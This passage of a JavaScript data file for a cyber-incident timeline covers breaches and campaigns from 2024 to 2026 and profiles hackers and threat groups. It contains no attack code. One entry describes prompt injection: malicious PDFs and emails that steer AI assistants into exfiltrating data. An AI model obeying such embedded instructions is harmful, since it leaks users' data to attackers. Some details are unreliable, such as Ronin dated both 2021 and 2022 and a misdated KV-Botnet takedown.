    name: 'Change Healthcare Ransomware — Largest Healthcare Breach in US History',
    tags: ['ransomware', 'ALPHV', 'BlackCat', 'healthcare', 'critical infrastructure'],
    severity: 'critical',
    shortDesc: 'ALPHV/BlackCat ransomware attack on UnitedHealth subsidiary disrupted US healthcare for months.',
    content: `The Change Healthcare ransomware attack is the most impactful cyberattack on US healthcare infrastructure in history, causing a cascading failure across the American medical system for months.

THE ATTACK (February 21, 2024):
• ALPHV/BlackCat ransomware affiliate gained access to Change Healthcare (a subsidiary of UnitedHealth Group) using stolen Citrix credentials — an account with no multi-factor authentication enabled
• Change Healthcare processes 15 billion healthcare transactions annually — roughly 1 in 3 US patient records flow through their systems
• The attack encrypted systems and exfiltrated approximately 6 terabytes of data including patient PII, medical records, insurance details, and financial data

IMPACT:
• Pharmacies nationwide (including CVS, Walgreens, military pharmacies) could not process prescriptions for days to weeks
• Hospitals could not verify patient insurance in real time, delaying procedures
• Medical providers could not submit claims; cash flow stopped for thousands of practices
• An estimated 190 million Americans had their data compromised — the largest healthcare data breach in US history
• UnitedHealth Group paid a $22 million ransom to ALPHV in Bitcoin; ALPHV then exit-scammed their own affiliate (who still had the data)
• The affiliate, "Notchy," then defected to RansomHub and extorted UnitedHealth again
• Total estimated cost to UnitedHealth: $870 million in direct costs (Q1 2024 earnings), with full-year impact projected over $1.6 billion

CONGRESSIONAL RESPONSE:
• UnitedHealth CEO Andrew Witty testified before Congress in May 2024
• HHS proposed mandatory minimum cybersecurity standards for healthcare organizations
• The attack reignited debate about consolidation in healthcare IT creating single points of catastrophic failure

CRIMINAL ACTION:
• ALPHV/BlackCat infrastructure seized by FBI in late 2023, but the group relaunched and conducted this attack before final collapse
• The affiliate behind the attack remains unidentified and at large`
  },
  {
    id: 'salt-typhoon-2024',
    year: 2024,
    name: 'Salt Typhoon — China Infiltrates US Telecom Wiretap Systems',
    tags: ['China', 'APT', 'telecom', 'wiretap', 'espionage', 'nation-state'],
    severity: 'critical',
    shortDesc: 'Chinese state hackers spent over a year inside US telecom networks, accessing lawful intercept infrastructure.',
    content: `Salt Typhoon (also tracked as Earth Estries, GhostEmperor, FamousSparrow) is a Chinese state-sponsored APT group whose 2024 intrusions into US telecommunications infrastructure are described by US officials as the worst telecom hack in American history.

THE OPERATION:
• Salt Typhoon gained access to the networks of at least nine major US telecommunications providers including AT&T, Verizon, Lumen Technologies (CenturyLink), T-Mobile, and others
• The group maintained persistent access for 12–18+ months before discovery
• Most alarmingly, they accessed the lawful intercept systems — the infrastructure built for court-authorized wiretapping used by the FBI and law enforcement — potentially allowing China to monitor US government surveillance targets

WHAT WAS ACCESSED:
• Metadata and content of calls and texts of senior US government officials including members of the Trump and Harris presidential campaigns
• Lawful intercept (CALEA) backend systems — the crown jewels of US surveillance infrastructure
• Generic telecommunications metadata at mass scale
• The complete list of targets of US law enforcement wiretap orders

SIGNIFICANCE:
• Described by Senator Mark Warner as "the worst telecom hack in our nation's history — by far"
• China effectively turned US surveillance infrastructure against the US
• Raised profound questions about CALEA backdoors: lawful intercept requirements create a vulnerability that adversaries can exploit
• FBI and CISA issued joint guidance recommending end-to-end encrypted communications (Signal) even for government officials

REMEDIATION:
• Telecom providers spent months working to expel the attackers; some networks reportedly remained compromised into early 2025
• The White House convened emergency sessions; the FCC proposed new cybersecurity rules for telecom carriers
• No individuals charged; China denied involvement`
  },
  {
    id: 'national-public-data-2024',
    year: 2024,
    name: 'National Public Data Breach — 2.9 Billion Records Leaked',
    tags: ['data breach', 'SSN', 'background check', 'dark web', 'identity theft'],
    severity: 'critical',
    shortDesc: 'Background check company leaked nearly 3 billion records including Social Security Numbers of most Americans.',
    content: `The National Public Data (NPD) breach is one of the largest data breaches in history by record count, exposing the personal information of hundreds of millions of Americans, Canadians, and British citizens.

WHAT HAPPENED:
• National Public Data, a background check company aggregating data from public records, was breached by a threat actor group called USDoD
• In April 2024, USDoD listed the stolen database on dark web forums asking $3.5 million for the data
• In August 2024, a hacker named "Fenice" leaked the full database for free on the Breachforums dark web forum
• The leaked data contained approximately 2.9 billion rows of records

WHAT WAS EXPOSED:
• Full legal names (including aliases and previous names)
• Social Security Numbers (SSNs)
• Physical addresses (current and historical, going back decades)
• Date of birth
• Phone numbers
• The data on some individuals included information going back 30+ years of address history

SCALE AND IMPACT:
• Estimated to affect most Americans who have ever appeared in public records
• Social Security Numbers are particularly damaging — they cannot be easily changed and are used to verify identity for loans, tax filings, and government benefits
• Identity theft wave followed; credit bureaus reported spikes in fraud alerts
• Class-action lawsuits filed in multiple states

AFTERMATH:
• National Public Data filed for bankruptcy in October 2024 as a direct result of the breach and legal liability
• The breach exposed a largely unregulated data broker industry that aggregates personal information without most individuals' knowledge or consent
• FTC renewed calls for comprehensive US federal data privacy legislation`
  },
  {
    id: 'lockbit-takedown-2024',
    year: 2024,
    name: 'Operation Cronos — LockBit Ransomware Takedown',
    tags: ['LockBit', 'law enforcement', 'Europol', 'NCA', 'FBI', 'ransomware takedown'],
    severity: 'high',
    shortDesc: 'International law enforcement operation seized LockBit infrastructure and unmasked its administrator.',
    content: `Operation Cronos was a landmark international law enforcement operation that dismantled the infrastructure of LockBit — the world's most prolific ransomware group — and publicly identified its administrator.

OPERATION (February 19–20, 2024):
• A coordinated operation involving the UK's National Crime Agency (NCA), FBI, Europol, and law enforcement from 10 countries simultaneously seized LockBit's dark web leak site and replaced it with a law enforcement notice
• 34 servers across Europe and North America seized
• Over 200 cryptocurrency wallets frozen
• 2 LockBit actors arrested in Poland and Ukraine
• Indictments unsealed in the US against additional members

KEY DISCLOSURES:
• LockBit's admin panel was seized; NCA published victim data, affiliate information, and negotiations that LockBit had promised to delete after ransom payment — proving the group lied to victims who paid
• Law enforcement obtained 1,000+ decryption keys; Europol and NCA offered them to victims for free
• NCA published a series of daily "LockBit Unboxed" revelations on the seized site, mocking the group

THE ADMIN — DMITRY KHOROSHEV:
• On May 7, 2024, the US, UK, and Australia sanctioned Dmitry Yuryevich Khoroshev (aka "LockBitSupp"), a Russian national, as the administrator of LockBit
• $10 million reward offered for his arrest
• He faces 26 federal charges in the US including extortion and computer fraud
• Khoroshev denied it was him; remains in Russia

AFTERMATH:
• LockBit attempted to relaunch within a week, but with severely diminished credibility
• The operation is considered the most significant ransomware disruption since the Hive takedown in 2023
• LockBit had been responsible for more attacks than any other ransomware group — 2,000+ known victims, $120M+ in ransom payments collected`
  },
  {
    id: 'volt-typhoon-2025',
    year: 2025,
    name: 'Volt Typhoon — China Pre-Positions in US Critical Infrastructure',
    tags: ['China', 'APT', 'critical infrastructure', 'living off the land', 'pre-positioning'],
    severity: 'critical',
    shortDesc: 'Chinese APT embedded in US power grids, water systems, and ports — positioned for wartime disruption.',
    content: `Volt Typhoon (also known as Bronze Silhouette and Vanguard Panda) is a Chinese state-sponsored APT group whose campaign against US critical infrastructure represents a strategic shift from espionage to pre-positioning for potential wartime sabotage.

BACKGROUND AND DISCOVERY:
• First publicly disclosed by Microsoft and CISA in May 2023, the group's activity continued and expanded through 2024–2025
• Active since at least 2021; some infrastructure compromises dated back to 5+ years before discovery
• January 2025: CISA, NSA, and FBI issued a joint advisory confirming Volt Typhoon had successfully compromised multiple US critical infrastructure sectors and maintained persistent access

TARGETED SECTORS:
• Electrical power generation and distribution (utility companies, grid operators)
• Water and wastewater treatment systems
• Oil and natural gas pipelines
• Transportation systems (ports, rail, airports)
• Telecommunications
• The group specifically targeted Guam — a critical US military hub in the Pacific

TACTICS (Living Off the Land):
• Volt Typhoon is distinguished by its near-total avoidance of custom malware
• Exploits edge devices: VPN appliances, routers, firewalls (Cisco, Fortinet, Ivanti, NETGEAR)
• Uses built-in OS tools: wmic, ntdsutil, netsh, PowerShell — making detection extremely difficult
• Compromised SOHO (small office/home office) routers to create a botnet proxy network (KV-Botnet), routing traffic through US-based IP addresses to avoid geographic detection
• Focus is persistence and stealth — maintaining footholds for years without taking action

STRATEGIC INTENT:
• US intelligence officials publicly stated the goal is NOT espionage but pre-positioning — implanting capabilities to disrupt infrastructure at a moment of geopolitical crisis (e.g., a Taiwan conflict)
• FBI Director Christopher Wray: "China's hackers are positioning on American infrastructure in preparation to wreak havoc and cause real-world harm to American citizens and communities"
• Represents a fundamental shift: critical infrastructure attacks as a component of great-power competition

RESPONSE:
• FBI conducted court-authorized operations to delete KV-Botnet malware from hundreds of US routers in January 2025
• CISA issued emergency directives to all federal agencies on edge device patching
• Congress held multiple classified briefings; bipartisan legislation proposed for infrastructure hardening`
  },
  {
    id: 'bybit-crypto-2025',
    year: 2025,
    name: 'Bybit Exchange Hack — $1.5 Billion Stolen by Lazarus Group',
    tags: ['North Korea', 'Lazarus Group', 'cryptocurrency', 'DeFi', 'safe wallet'],
    severity: 'critical',
    shortDesc: 'The largest cryptocurrency theft in history: North Korea\'s Lazarus Group stole $1.5B from Bybit.',
    content: `The Bybit hack of February 21, 2025 is the single largest cryptocurrency theft in history, surpassing the previous record of $625M from Ronin Network in 2022 — and it was executed through a supply chain attack on a trusted wallet interface, not a blockchain vulnerability.

THE ATTACK:
• Bybit is one of the world's largest cryptocurrency exchanges, based in Dubai, with $16B+ in assets under custody at the time
• North Korea's Lazarus Group compromised Safe{Wallet} (formerly Gnosis Safe), a widely used multi-signature smart contract wallet platform
• The attackers inserted malicious JavaScript into Safe's front-end interface, targeting Bybit's cold wallet specifically
• When Bybit's signers approved what appeared to be a routine cold-to-warm wallet transfer, the malicious code modified the transaction in real time to redirect approximately 401,347 ETH (worth ~$1.5 billion) to Lazarus-controlled wallets
• The transaction appeared legitimate in the Safe UI; the signers had no indication anything was wrong

LAUNDERING OPERATION:
• Within hours, Lazarus began moving funds through a complex laundering chain
• ETH split across thousands of wallets; swapped to Bitcoin and other assets via decentralized exchanges (THORChain saw record volume)
• On-chain investigators (ZachXBT, Chainalysis, Elliptic) tracked funds in real-time; exchanges froze some portions
• An estimated 20% of funds were frozen or recovered through industry cooperation; 80% successfully laundered

ATTRIBUTION:
• ZachXBT provided on-chain forensic evidence linking the hack to Lazarus Group within hours of the theft
• US Treasury, FBI, and blockchain analytics firms confirmed attribution
• North Korea's total cryptocurrency theft now estimated at $6B+ since 2017 — used to fund weapons programs under sanctions

INDUSTRY IMPACT:
• Bybit remained solvent; CEO Ben Zhou conducted a live stream promising to cover losses; emergency loans secured within 24 hours
• The hack exposed the security risks of hardware wallet signers relying on browser-based front-ends
• Industry-wide audit of Safe{Wallet} deployments; stricter transaction verification procedures adopted
• The US DOJ and CISA issued guidance on hardware wallet best practices for exchanges`
  },
  {
    id: 'agentic-ai-threats-2025',
    year: 2025,
    name: 'Agentic AI Threats & Autonomous Cyberattacks',
    tags: ['AI', 'agentic AI', 'autonomous attacks', 'LLM', 'prompt injection'],
    severity: 'critical',
    shortDesc: 'AI agents capable of autonomously conducting multi-step cyberattacks emerge as a new threat class.',
    content: `2025 marked the transition from AI-assisted attacks to AI-autonomous attacks, where large language model (LLM) agents conduct multi-step offensive operations with minimal human direction.

EMERGING THREAT: AGENTIC AI ATTACKS:
• Security researchers demonstrated LLM agents (GPT-4 class and above) capable of autonomously finding and exploiting one-day vulnerabilities — reading CVE descriptions, generating exploits, and compromising systems without human input
• University of Illinois research (2024, published 2025): GPT-4 agents successfully exploited 87% of one-day vulnerabilities tested when given CVE descriptions, outperforming every open-source model and prior automated tools
• "Operator-style" AI agents chained together web browsing, code execution, and API calls to conduct phishing campaigns, credential harvesting, and lateral movement autonomously

DEEPFAKE ATTACKS AT SCALE:
• Deepfake voice and video phishing (vishing/video phishing) became commercially viable for criminal groups
• Real-time voice cloning APIs available for under $10/month; used in mass BEC campaigns impersonating executives
• First confirmed deepfake video call fraud resulting in $26M transfer (Hong Kong, 2024) was followed by multiple similar incidents globally in 2025
• AI-generated synthetic identities (faces, voices, documents) used to bypass KYC (Know Your Customer) at financial institutions at scale

PROMPT INJECTION AS AN ATTACK VECTOR:
• As enterprises deployed LLM-powered AI assistants, "prompt injection" attacks emerged — malicious instructions embedded in documents, emails, or web pages that hijack an AI agent's actions
• Demonstrated attacks: malicious PDFs that instruct an AI document assistant to exfiltrate data; emails that redirect AI email agents to send sensitive information to attackers
• OWASP released the "OWASP Top 10 for LLM Applications" to address this new attack surface

AI-POWERED DEFENSIVE CAPABILITIES:
• Simultaneously, AI-powered threat detection and response matured: CrowdStrike, Microsoft Defender, and others deployed AI that reduced mean time to detect (MTTD) to under 1 minute for known attack patterns
• AI-generated threat intelligence summarization became standard in SOC workflows
• The "AI vs AI" paradigm — autonomous offensive agents versus autonomous defensive agents — emerged as the defining challenge of the era`
  },
  {
    id: 'telecom-infrastructure-2026',
    year: 2026,
    name: 'Global Telecom Infrastructure Under Sustained Nation-State Attack',
    tags: ['nation-state', 'telecom', 'SS7', 'critical infrastructure', '2026'],
    severity: 'critical',
    shortDesc: 'Coordinated campaigns by multiple nation-state actors target global telecommunications backbone infrastructure.',
    content: `By 2026, the convergence of multiple nation-state hacking campaigns against telecommunications infrastructure — exposed through Salt Typhoon and continued operations — created a sustained security crisis across global communications networks.

ESCALATING TELECOM TARGETING:
• Following the Salt Typhoon disclosures of 2024, investigations revealed additional Chinese, Russian, and Iranian APT groups had independently compromised overlapping sets of telecom providers globally
• The SS7 (Signalling System No. 7) protocol — the aging backbone of global phone networks — continued to be exploited for real-time location tracking and call interception, with known vulnerabilities unpatched due to carrier complexity and cost
• 5G network slicing vulnerabilities emerged as a new attack surface; researchers demonstrated cross-slice data leakage affecting enterprise tenants

LAWFUL INTERCEPT INFRASTRUCTURE CRISIS:
• Multiple democratic governments were forced to confront the fundamental tension: CALEA-style lawful intercept requirements create vulnerabilities that adversaries exploit
• US legislation introduced to mandate end-to-end encryption defaults in commercial communications
• UK's Online Safety Act provisions requiring backdoor access to encrypted communications faced pushback from GCHQ and NSA who cited foreign exploitation risk

RESPONSE AND HARDENING:
• FCC mandated minimum cybersecurity standards for US telecom carriers for the first time, including network segmentation requirements and incident reporting within 72 hours
• NATO established a dedicated Telecom Resilience Center for member state coordination
• Migration to encrypted communication protocols accelerated; Signal and similar apps reached majority adoption among government and enterprise users in several countries

AI-ENHANCED THREAT ACTOR CAPABILITY:
• Nation-state actors began deploying AI tools to accelerate vulnerability discovery in telecom vendor software (Cisco IOS, Juniper JunOS, Ericsson baseband)
• Automated exploit generation reduced the time from CVE disclosure to weaponization below 24 hours for critical network device vulnerabilities
• CISA's "Known Exploited Vulnerabilities" catalog expanded to over 1,500 entries, with telecom and network device CVEs representing the fastest-growing category`
  },
  {
    id: 'ransomware-evolution-2026',
    year: 2026,
    name: 'Ransomware 3.0 — AI-Orchestrated, Quadruple Extortion',
    tags: ['ransomware', 'AI', 'quadruple extortion', 'RaaS', 'critical infrastructure'],
    severity: 'critical',
    shortDesc: 'Next-generation ransomware operations use AI for targeting, negotiation, and pressure — escalating to quadruple extortion.',
    content: `By 2026, ransomware had evolved into a highly sophisticated, AI-augmented criminal industry operating with the scale and structure of legitimate enterprises — while the extortion model expanded to a fourth pressure layer.

RANSOMWARE 3.0 CHARACTERISTICS:
• AI-driven victim selection: Automated financial analysis of target organizations using public data (revenue, cyber insurance disclosures, SEC filings) to set optimal ransom demands
• AI-negotiation bots: Initial ransom negotiations conducted by LLMs trained on thousands of prior negotiation transcripts, mimicking human negotiators with psychological pressure tactics
• AI-accelerated intrusion: From initial access to full domain compromise reduced to under 4 hours in well-resourced operations using autonomous lateral movement tools
• Custom malware generation per campaign: AI-generated polymorphic ransomware unique to each deployment, defeating signature-based detection

QUADRUPLE EXTORTION MODEL:
1. Encryption — encrypt victim files, demand ransom for decryptor
2. Data exfiltration — threaten to publish sensitive data on leak sites
3. DDoS — launch DDoS against victim's public infrastructure to increase pressure
4. Third-party pressure — directly contact victims' customers, partners, regulators, and journalists with evidence of the breach

CRITICAL INFRASTRUCTURE TARGETING:
• Hospital systems remained the most targeted sector due to low tolerance for operational disruption
• Water treatment facilities, power substations, and railway operators faced increasing ransomware incidents
• Several attacks on European hospitals resulted in patient deaths attributed to ransomware-caused care delays — elevating ransomware to a life-safety issue legally in multiple jurisdictions

LAW ENFORCEMENT AND POLICY RESPONSE:
• US Cyber Command conducted its most aggressive offensive cyber operations against ransomware infrastructure, disrupting multiple groups before planned attacks
• G7 nations agreed on a no-ransom-payment policy framework for government entities
• Mandatory cyber incident reporting requirements expanded in the US (SEC rules, CIRCIA), EU (NIS2 Directive enforcement), and UK
• Insurance industry tightened ransomware coverage terms; many policies now exclude attacks attributed to nation-state actors, creating coverage gaps
• Several US states criminalized ransom payments to designated threat actor groups without prior government authorization`
  }
],

// ──────────────────────────────────────────────
//  HACKERS
// ──────────────────────────────────────────────
hackers: [
  {
    id: 'kevin-mitnick',
    name: 'Kevin Mitnick',
    aka: 'The Condor',
    icon: '🎩',
    type: 'individual',
    era: '1980s–2000s',
    nationality: 'American',
    status: 'Deceased (2023)',
    tags: ['social engineering', 'phone phreaking', 'legend'],
    shortDesc: 'Once the most wanted cybercriminal in the US; became the world\'s most famous hacker.',
    content: `Kevin Mitnick was a legendary hacker who began his career as a phone phreak in the 1970s and became notorious for breaking into dozens of major corporations and government systems. His weapon of choice was social engineering — he rarely needed to write exploit code.

CAREER HIGHLIGHTS:
• Hacked ARPANET at age 17 (1983)
• Broke into Nokia, Motorola, Sun Microsystems, Fujitsu, dozens more
• Used social engineering to manipulate employees into revealing passwords
• Fugitive for years; taunted FBI while on the run (1992–1995)
• Arrested in 1995 after being traced by hacker Tsutomu Shimomura
• Sentenced to 5 years; spent 8 months in solitary confinement (authorities feared he could launch nuclear missiles via whistling into a phone)

LATER LIFE:
• Released in 2000; became world-famous security consultant
• Founded Mitnick Security Consulting
• Wrote several books: "The Art of Deception," "The Art of Intrusion," "Ghost in the Wires" (autobiography)
• Died July 16, 2023, from pancreatic cancer
• His "World's Most Wanted Hacker" reputation was never exceeded

LEGACY: Demonstrated that human psychology is the greatest security vulnerability. Transformed the understanding of social engineering.`,
    meta: { realName: 'Kevin David Mitnick', born: '1963', died: '2023', sentence: '5 years federal prison' }
  },
  {
    id: 'anonymous',
    name: 'Anonymous',
    aka: 'Anons, Legion',
    icon: '🎭',
    type: 'group',
    era: '2003–present',
    nationality: 'International',
    status: 'Active (decentralized)',
    tags: ['hacktivist', 'collective', 'political', 'DDoS'],
    shortDesc: 'Decentralized international hacktivist collective known for Guy Fawkes masks.',
    content: `Anonymous is a decentralized hacktivist collective with no leadership, hierarchy, or membership structure. Anyone can claim to act "as Anonymous." Originated on 4chan's /b/ board.

MAJOR OPERATIONS:
• Operation Chanology (2008) — vs. Church of Scientology (DDoS, protests)
• Operation Payback (2010) — vs. anti-piracy groups, then vs. Visa/MC/PayPal after WikiLeaks funding cut
• Arab Spring Support (2011) — helping protesters in Egypt, Tunisia, Libya
• Operation AntiSec (2011) — with LulzSec; against FBI, police, government
• Operation Ferguson (2014) — after Michael Brown shooting
• Operation KKK (2015) — exposed KKK members
• Operation ISIS/OpISIS (2015) — after Paris attacks, targeted ISIS online
• Operation Russia (2022) — attacked Russian government after Ukraine invasion; leaked FSB data

TOOLS: LOIC (Low Orbit Ion Cannon) for DDoS, doxing, social engineering, website defacement.

PHILOSOPHY: Opposes censorship, surveillance, corruption, and religious control. Supports transparency, free speech, and whistleblowing.

NOTABLE SPIN-OFFS: LulzSec, AntiSec, AnonOps, various regional Anonymous cells.`,
    meta: { formed: '2003 (4chan)', type: 'Decentralized collective', symbol: 'Guy Fawkes mask' }
  },
  {
    id: 'gary-mckinnon',
    name: 'Gary McKinnon',
    aka: 'Solo',
    icon: '🛸',
    type: 'individual',
    era: '2000s',
    nationality: 'British',
    status: 'Never prosecuted',
    tags: ['NASA', 'Pentagon', 'UFO', 'Asperger\'s'],
    shortDesc: 'Hacked 97 US military and NASA computers from his bedroom looking for UFO evidence.',
    content: `Gary McKinnon, a Scottish systems administrator with Asperger syndrome, conducted what the US government called "the biggest military computer hack of all time" between 2001–2002. He accessed 97 US military and NASA computers using a simple Perl script to find unsecured systems with blank administrator passwords.

WHAT HE FOUND (claimed):
• A spreadsheet listing "Non-Terrestrial Officers" and "fleet-to-fleet transfers" of unrecognized craft
• High-resolution NASA images of cylindrical UFOs (allegedly deleted immediately after accessing)
• Evidence of "free energy suppression"

AFTERMATH:
• US sought his extradition (facing 70 years in prison)
• His case became a major UK political issue; fought extradition for 10 years
• UK Home Secretary Theresa May blocked his extradition in 2012 — unprecedented
• Cited Asperger's diagnosis and mental health concerns
• Never faced trial; no UK charges pursued
• Became a symbol in debates about extradition treaties, mental health, and proportionate justice

He always maintained he meant no harm and was genuinely searching for government UFO evidence.`,
    meta: { compromised: '97 US military/NASA computers', sentence: 'Never tried', extradition: 'Blocked by UK Home Secretary 2012' }
  },
  {
    id: 'albert-gonzalez',
    name: 'Albert Gonzalez',
    aka: 'soupnazi, segvec, j4guar17',
    icon: '💳',
    type: 'individual',
    era: '2000s',
    nationality: 'American (Cuban-born)',
    status: 'Imprisoned',
    tags: ['carding', 'financial fraud', 'TJX', 'Heartland'],
    shortDesc: 'Orchestrated the largest credit card theft in history — 170M+ card numbers.',
    content: `Albert Gonzalez is responsible for the largest credit/debit card theft in history. He operated the ShadowCrew carding forum before becoming an FBI informant — then continued hacking while working for the government.

MAJOR BREACHES:
• TJX Companies (2005–2007): 45.6M credit cards
• Dave & Buster's (2007): 130,000 card numbers
• Heartland Payment Systems (2008): 130M card numbers
• 7-Eleven, Hannaford Brothers, and others

METHOD: SQL injection and wardriving (driving around parking lots with laptop to steal WiFi) to breach retail point-of-sale systems. Installed packet sniffers to capture card data in transit.

LIFESTYLE: Lived a lavish criminal life — threw himself a $75,000 birthday party, complained about counting $340,000 in cash because his "hands hurt."

SENTENCE: Three concurrent 20-year sentences (the longest ever for computer crime in the US at the time). Currently at FCI Jesup, GA; eligible for release in 2025.`,
    meta: { cardsStolen: '170M+', sentence: '20 years federal prison', method: 'SQL injection, packet sniffing' }
  },
  {
    id: 'robert-morris',
    name: 'Robert Tappan Morris',
    aka: 'rtm',
    icon: '🐛',
    type: 'individual',
    era: '1980s',
    nationality: 'American',
    status: 'MIT Professor',
    tags: ['worm', 'CFAA', 'first conviction', 'academic'],
    shortDesc: 'Created the Morris Worm; first person convicted under the CFAA. Now an MIT professor.',
    content: `Robert Tappan Morris was a 23-year-old Cornell University graduate student when he released the Morris Worm in 1988 — the first worm to gain widespread attention on the internet. He claimed he intended it as an experiment to measure the internet's size, not to cause damage.

THE WORM:
• Exploited vulnerabilities in Unix sendmail, fingerd, and rsh/rexec
• A bug in the replication logic caused it to spread far more aggressively than intended
• Infected ~6,000 computers (10% of the internet)
• Caused $10M–$100M in damages
• Required complete system reinstallation to remove

CONVICTION:
• First person ever convicted under the Computer Fraud and Abuse Act (CFAA, 1986)
• Sentenced to 3 years probation, 400 hours community service, $10,050 fine

AFTERMATH:
• Co-founded Viaweb (sold to Yahoo for $49M in 1998 → became Yahoo Store)
• Co-founded Y Combinator, the world's most successful startup accelerator
• Currently a professor at MIT CSAIL (Computer Science and AI Laboratory)
• Son of Robert H. Morris, former NSA chief scientist`,
    meta: { conviction: 'First CFAA conviction (1989)', penalty: '3 years probation, $10K fine', laterCareer: 'MIT professor, Y Combinator co-founder' }
  },
  {
    id: 'jonathan-james',
    name: 'Jonathan James',
    aka: 'c0mrade',
    icon: '🚀',
    type: 'individual',
    era: '1990s–2000s',
    nationality: 'American',
    status: 'Deceased (2008)',
    tags: ['NASA', 'DOD', 'teenager', 'suicide'],
    shortDesc: 'First juvenile incarcerated for cybercrime in the US; hacked NASA and DoD at age 15.',
    content: `Jonathan James became the first juvenile incarcerated for cybercrime in the United States. He began hacking at age 15.

HACKS:
• Penetrated BellSouth and Miami-Dade school systems
• Installed a backdoor on US Defense Threat Reduction Agency (DTRA) servers — downloading usernames/passwords for over 3,300 employees and intercepting 3,000+ messages
• Hacked NASA's Marshall Space Flight Center — stole software worth $1.7M used to support the International Space Station's physical environment. NASA had to shut down systems for 21 days ($41,000 in cost)

CONSEQUENCES:
• Sentenced to 6 months house arrest and probation at age 16 (too young to be sent to adult prison)
• Violated probation; served 6 months in detention center

DEATH:
• In 2008, following the TJX breach investigation, James was considered a suspect (he denied involvement)
• Died of a self-inflicted gunshot wound on May 18, 2008, age 24
• Left a suicide note stating he did not trust the justice system and feared being convicted for crimes he didn't commit

His case raised questions about juvenile hacking, mental health, and the proportionality of US cybercrime prosecutions.`,
    meta: { ageOfFirstHack: '15', sentence: '6 months detention', died: '2008, age 24' }
  },
  {
    id: 'apt28',
    name: 'Fancy Bear (APT28)',
    aka: 'Sofacy, Pawn Storm, Sednit, STRONTIUM',
    icon: '🐻',
    type: 'state-sponsored',
    era: '2004–present',
    nationality: 'Russian (GRU Unit 26165)',
    status: 'Active',
    tags: ['Russia', 'GRU', 'espionage', 'election interference', 'APT'],
    shortDesc: 'Russia\'s GRU military intelligence hacking unit; responsible for DNC hack and election interference.',
    content: `Fancy Bear (APT28) is a Russian cyber espionage group operating under the GRU (Russia's military intelligence). It has been active since at least 2004 and is considered one of the most sophisticated and dangerous APT groups.

MAJOR OPERATIONS:
• 2014–2016: Democratic National Committee (DNC) hack — stolen emails published via WikiLeaks and Guccifer 2.0, influencing 2016 US election
• 2015: German Bundestag hack — 16GB of data stolen
• 2015: French TV5Monde — took down all channels, replaced broadcasts with ISIS propaganda
• 2016: Hillary Clinton campaign chairman John Podesta email hack (via spearphishing)
• 2016: World Anti-Doping Agency (WADA) — leaked athletes' confidential medical records
• 2017: Macron campaign (France) — attempted election interference
• 2019: NATO, European political parties
• 2023: Ukraine-related espionage, ongoing

TECHNIQUES: Spearphishing, X-Agent malware, X-Tunnel, Sofacy/Fancy Bear toolkit, zero-days.

Indicted by Mueller investigation (12 Russian GRU officers named in 2018 indictment).`,
    meta: { country: 'Russia', sponsor: 'GRU (Military Intelligence)', active: '2004–present' }
  },
  {
    id: 'lazarus-group',
    name: 'Lazarus Group',
    aka: 'Hidden Cobra, Guardians of Peace, APT38',
    icon: '🇰🇵',
    type: 'state-sponsored',
    era: '2009–present',
    nationality: 'North Korean (RGB)',
    status: 'Active',
    tags: ['North Korea', 'financial crime', 'ransomware', 'cryptocurrency'],
    shortDesc: 'North Korea\'s elite hacking unit; funds regime via crypto theft and ransomware.',
    content: `Lazarus Group is a state-sponsored advanced persistent threat group attributed to North Korea's Reconnaissance General Bureau (RGB). Unlike other state APTs focused on espionage, Lazarus is uniquely motivated by financial gain — their cybercrime funds North Korea's weapons programs under international sanctions.

MAJOR OPERATIONS:
• 2014: Sony Pictures hack — in retaliation for "The Interview" film; leaked unreleased films, celebrity SSNs, executive emails
• 2016: Bangladesh Bank Heist — nearly stole $1 billion via SWIFT banking network; $81M successfully stolen
• 2017: WannaCry ransomware — 200,000+ victims, $4B+ damage
• 2018: $571M in cryptocurrency stolen from Coincheck (Japan)
• 2021: Ronin Network (Axie Infinity) — $625M stolen in crypto — largest crypto hack ever
• 2022: Harmony's Horizon Bridge — $100M stolen
• 2023–2024: Ongoing cryptocurrency exchange attacks

TOTAL ESTIMATED THEFT: $3–5+ billion in cryptocurrency.

TECHNIQUES: Custom malware (FALLCHILL, HARDRAIN), watering hole attacks, supply chain attacks, LinkedIn fake job recruitment lures.`,
    meta: { country: 'North Korea', sponsor: 'RGB (Intelligence)', estimatedTheft: '$3–5B+' }
  },
  {
    id: 'revil',
    name: 'REvil (Sodinokibi)',
    aka: 'Sodin, Gold Southfield',
    icon: '💰',
    type: 'criminal-group',
    era: '2019–2022',
    nationality: 'Russian',
    status: 'Dismantled (2022)',
    tags: ['ransomware', 'RaaS', 'extortion', 'dark web'],
    shortDesc: 'Most prolific ransomware-as-a-service group; demanded $70M from Kaseya victims.',
    content: `REvil (also known as Sodinokibi) was the most prolific and sophisticated ransomware-as-a-service (RaaS) group of the early 2020s. They operated a dark web "Happy Blog" to pressure victims by publishing stolen data.

NOTABLE ATTACKS:
• Travelex (2019): £6M paid; currency exchange paralyzed weeks
• Grubman Shire Meiselas & Sacks (2020): Entertainment law firm; threatened to publish Donald Trump, Madonna, Lady Gaga, Bruce Springsteen contracts
• JBS Foods (2021): Largest meat producer; $11M ransom paid, disrupted global meat supply
• Kaseya VSA (2021): Supply chain attack hitting 1,500+ businesses via IT management software; $70M ransom demanded
• Acer (2021): $50M demanded

BUSINESS MODEL (RaaS):
• Recruited affiliates who conducted attacks using REvil's tools
• Took 20–30% of ransom payments; affiliates kept 70–80%
• Ran auctions for stolen data on dark web

DOWNFALL:
• REvil's infrastructure taken down in October 2021
• Russia arrested 14 members in January 2022 (under US pressure)
• Several members sentenced; group effectively disbanded`,
    meta: { active: '2019–2022', model: 'Ransomware-as-a-Service', largestDemand: '$70M (Kaseya)' }
  },
  {
    id: 'shadow-brokers',
    name: 'The Shadow Brokers',
    aka: 'TSB',
    icon: '🔓',
    type: 'unknown',
    era: '2016–2017',
    nationality: 'Unknown (suspected Russian)',
    status: 'Inactive',
    tags: ['NSA', 'EternalBlue', 'zero-day', 'leak', 'cyberweapons'],
    shortDesc: 'Mysterious group that leaked NSA cyberweapons, enabling WannaCry and NotPetya.',
    content: `The Shadow Brokers is a mysterious hacking group that appeared in August 2016, claiming to have stolen a cache of cyberweapons from the NSA's elite hacking unit, Equation Group. Their leaks had catastrophic consequences.

LEAKS:
• August 2016: Offered to auction stolen NSA exploits for 1M Bitcoin (~$500M at the time); no buyers
• October 2016: Leaked 60% of stolen tools for free after failed auction
• April 2017: "Lost in Translation" dump — released EternalBlue, EternalChampion, EternalSynergy (SMB exploits), DoublePulsar backdoor, and over 300 domain names targeting SWIFT banking

IMPACT OF LEAKS:
• WannaCry (May 2017) — used EternalBlue to spread ransomware globally ($4B+ damage)
